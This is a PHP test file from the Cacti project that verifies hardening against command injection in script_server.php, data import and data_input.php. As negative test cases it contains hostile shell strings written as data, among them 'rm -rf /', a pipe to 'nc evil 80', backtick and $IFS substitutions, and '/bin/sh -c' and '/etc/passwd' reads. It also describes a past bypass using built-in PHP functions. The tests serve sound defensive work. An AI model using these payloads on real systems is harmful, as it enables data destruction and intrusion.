<?php
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2026 The Cacti Group                                 |
 |                                                                         |
 | This program is free software; you can redistribute it and/or           |
 | modify it under the terms of the GNU General Public License             |
 | as published by the Free Software Foundation; either version 2          |
 | of the License, or (at your option) any later version.                  |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
*/

/*
 * Source-level + behavioural tests for the script_server / data_input
 * hardening on this branch:
 *
 *   1) script_server.php must validate the include path UNCONDITIONALLY,
 *      reject PHP internals via ReflectionFunction::isInternal(), and
 *      reject any function whose source file resolves outside
 *      $config['base_path']. The previous code skipped path validation
 *      whenever function_exists() was true, so any built-in (system,
 *      passthru, exec, ...) bypassed the guard and was dispatched
 *      directly via call_user_func_array().
 *
 *   2) cacti_input_string_is_safe() must catch the same shell
 *      metacharacters the GUI rejected (;, &, |, backtick, $, \, CR, LF)
 *      while leaving the <placeholder> syntax alone.
 *
 *   3) lib/import.php's xml_to_data_input_method() must run
 *      cacti_input_string_is_safe() over the imported input_string and
 *      return false (refusing to persist) when an XML/package payload
 *      smuggles a metacharacter the GUI would have rejected.
 *
 *   4) data_input.php form_save() must use the shared validator instead
 *      of an inline regex so the two paths cannot drift.
 */

$scriptServerSource = file_get_contents(__DIR__ . '/../../script_server.php');
$functionsSource    = file_get_contents(__DIR__ . '/../../lib/functions.php');
$dataInputSource    = file_get_contents(__DIR__ . '/../../data_input.php');
$importSource       = file_get_contents(__DIR__ . '/../../lib/import.php');

/* --- Finding 1: script_server validates path unconditionally --- */

test('script_server path validation is not gated on !function_exists', function () use ($scriptServerSource) {
	/* The vulnerable shape was:
	 *   if (!function_exists($function)) {
	 *       $real_include = realpath($include_file);
	 *       ...path containment checks...
	 *   }
	 * That construct must no longer exist. realpath() of include_file must
	 * occur BEFORE any function_exists() check so built-ins cannot bypass it. */
	$pattern = '/if\s*\(\s*!function_exists\s*\(\s*\$function\s*\)\s*\)\s*\{\s*\n\s*\$real_include\s*=\s*realpath\s*\(\s*\$include_file\s*\)/';
	expect(preg_match($pattern, $scriptServerSource))
		->toBe(0, 'realpath($include_file) must not sit inside an if (!function_exists($function)) gate');

	/* And the realpath/include_file pairing must still exist somewhere. */
	expect(strpos($scriptServerSource, 'realpath($include_file)'))->not->toBeFalse();
});

test('script_server rejects PHP internal functions via ReflectionFunction', function () use ($scriptServerSource) {
	expect(strpos($scriptServerSource, 'new ReflectionFunction($function)'))
		->not->toBeFalse('script_server must introspect the function before dispatch');
	expect(strpos($scriptServerSource, '$ref->isInternal()'))
		->not->toBeFalse('PHP internal functions must be rejected explicitly');
	expect(strpos($scriptServerSource, "Refusing to dispatch PHP internal function"))
		->not->toBeFalse('rejection must be logged so operators can see the attempt');
});

test('script_server rejects functions defined outside base_path', function () use ($scriptServerSource) {
	expect(strpos($scriptServerSource, '$ref->getFileName()'))
		->not->toBeFalse('the source file of the function must be checked');
	expect(strpos($scriptServerSource, "defined outside base path"))
		->not->toBeFalse('out-of-tree definitions must be rejected with a log line');
});

test('script_server emits U on every rejection branch', function () use ($scriptServerSource) {
	/* Each rejection must respond to the poller with the standard
	 * "U\n" no-data marker and continue the request loop, not silently
	 * fall through into call_user_func_array(). */
	$start    = strpos($scriptServerSource, 'Validate the include path unconditionally');
	$end      = strpos($scriptServerSource, 'call_user_func_array($function, $parameter_array)', $start);
	$region   = substr($scriptServerSource, $start, $end - $start);

	$rejects  = substr_count($region, "fputs(STDOUT, \"U\\n\")");
	$continues = substr_count($region, 'continue;');

	expect($rejects)->toBeGreaterThanOrEqual(5, 'at least five rejection branches must emit U');
	expect($continues)->toBeGreaterThanOrEqual(5, 'each rejection must continue the request loop');
});

/* --- Finding 2: cacti_input_string_is_safe behaviour --- */

test('cacti_input_string_is_safe is defined in lib/functions.php', function () use ($functionsSource) {
	expect(strpos($functionsSource, 'function cacti_input_string_is_safe('))
		->not->toBeFalse();
});

test('cacti_input_string_is_safe extracts and runs against canonical payloads', function () use ($functionsSource) {
	/* Pull the function definition out of lib/functions.php and evaluate it
	 * in test scope. Requiring the whole file would drag in the full Cacti
	 * bootstrap, which other tests in this directory deliberately avoid. */
	preg_match(
		'/^function cacti_input_string_is_safe\([^)]*\)\s*\{.*?^\}/sm',
		$functionsSource,
		$m
	);
	expect($m)->not->toBeEmpty('cacti_input_string_is_safe definition must be extractable');

	/* Rename to avoid colliding if another test loaded the real one. */
	$src = preg_replace('/^function cacti_input_string_is_safe\(/m', 'function _test_input_string_is_safe(', $m[0]);
	if (!function_exists('_test_input_string_is_safe')) {
		eval($src);
	}

	/* placeholder syntax stays safe */
	expect(_test_input_string_is_safe(''))->toBeTrue();
	expect(_test_input_string_is_safe('snmpwalk -v 2c -c <community> <host>'))->toBeTrue();
	expect(_test_input_string_is_safe('/usr/local/bin/check.sh <host_ip>'))->toBeTrue();

	/* Legitimate templates that the strip pattern must accept after the
	 * issue #7121 fix: paired quotes around placeholders are standard shell
	 * arg-quoting, and digit-suffixed placeholder names are common in
	 * grid/RTM-style packages. Both were rejected by the original strip
	 * (<[a-zA-Z_]+>) plus the GHSA-c4qp blocklist. */
	expect(_test_input_string_is_safe('<path_cacti>/scripts/ss_grid_preason.php ss_grid_preason <clusterid> "<reason>"'))->toBeTrue();
	expect(_test_input_string_is_safe('<path_php_binary> -q <path_cacti>/scripts/x.php --hostname="<host>" --community="<community>"'))->toBeTrue();
	expect(_test_input_string_is_safe("<path_cacti>/scripts/x.php '<reason>'"))->toBeTrue();
	expect(_test_input_string_is_safe('<path_cacti>/scripts/x.php <arg1> <host_id2>'))->toBeTrue();
	expect(_test_input_string_is_safe('<path_php_binary> -q <path_cacti>/scripts/x.php "<arg1>"'))->toBeTrue();

	/* original metachar set */
	expect(_test_input_string_is_safe('cmd <host>; rm -rf /'))->toBeFalse();
	expect(_test_input_string_is_safe('cmd <host> && reboot'))->toBeFalse();
	expect(_test_input_string_is_safe('cmd <host> | nc evil 80'))->toBeFalse();
	expect(_test_input_string_is_safe('echo `whoami`'))->toBeFalse();
	expect(_test_input_string_is_safe('echo $IFS$9'))->toBeFalse();
	expect(_test_input_string_is_safe("template\nwith\nnewline"))->toBeFalse();
	expect(_test_input_string_is_safe("template\rwith\rcr"))->toBeFalse();
	expect(_test_input_string_is_safe('echo \\$(whoami)'))->toBeFalse();

	/* GHSA-c4qp bypass chars added in this PR: single-quote, double-quote,
	 * redirect operators, and subshell delimiters.
	 * Payloads that were accepted before the fix and must now be rejected. */
	expect(_test_input_string_is_safe("/bin/sh -c 'id'"))->toBeFalse();
	expect(_test_input_string_is_safe('/usr/bin/curl http://x > /tmp/out'))->toBeFalse();
	expect(_test_input_string_is_safe('echo "hello"'))->toBeFalse();
	expect(_test_input_string_is_safe('/bin/sh -c (id)'))->toBeFalse();
	expect(_test_input_string_is_safe('cmd {dangerous}'))->toBeFalse();
	/* redirect < */
	expect(_test_input_string_is_safe('cmd < /etc/passwd'))->toBeFalse();
});

/* --- Finding 3: import path applies the same validator --- */

test('xml_to_data_input_method runs cacti_input_string_is_safe before persisting', function () use ($importSource) {
	$start = strpos($importSource, 'function xml_to_data_input_method(');
	expect($start)->not->toBeFalse();

	$end  = strpos($importSource, "\nfunction ", $start + 1);
	$body = substr($importSource, $start, $end !== false ? $end - $start : 6000);

	/* The validator must be called against the decoded input_string,
	 * before sql_save() reaches the row, and a failure must short-circuit
	 * the function with `return false;`. */
	$validatorPos = strpos($body, '!cacti_input_string_is_safe($save[$field_name])');
	expect($validatorPos)->not->toBeFalse('the shared validator must gate the imported input_string');

	$sqlSavePos = strpos($body, "sql_save(\$save, 'data_input')");
	expect($sqlSavePos)->not->toBeFalse('sql_save call must remain present');
	expect($validatorPos < $sqlSavePos)->toBeTrue(
		'validator must run before sql_save persists the row'
	);

	/* The rejection branch must not raise_message (GUI-only) and must
	 * return false to skip persistence and dependent fields. */
	$rejectRegion = substr($body, $validatorPos, 600);
	expect(strpos($rejectRegion, 'return false;'))->not->toBeFalse(
		'rejection must abort the import for this method'
	);
	expect(strpos($rejectRegion, 'raise_message'))->toBeFalse(
		'raise_message is GUI-only and must not appear in the import path'
	);
});

/* --- Finding 4: data_input.php uses the shared helper --- */

test('data_input.php form_save uses cacti_input_string_is_safe', function () use ($dataInputSource) {
	expect(strpos($dataInputSource, "cacti_input_string_is_safe(\$save['input_string'])"))
		->not->toBeFalse('GUI save must call the shared helper');

	/* The previous inline regex must be gone so the two paths cannot drift. */
	expect(strpos($dataInputSource, "preg_match('/[;&|`\$\\\\\\\\\\n\\r]/'"))
		->toBeFalse('the inline shell-metacharacter regex must be replaced by the helper');
});
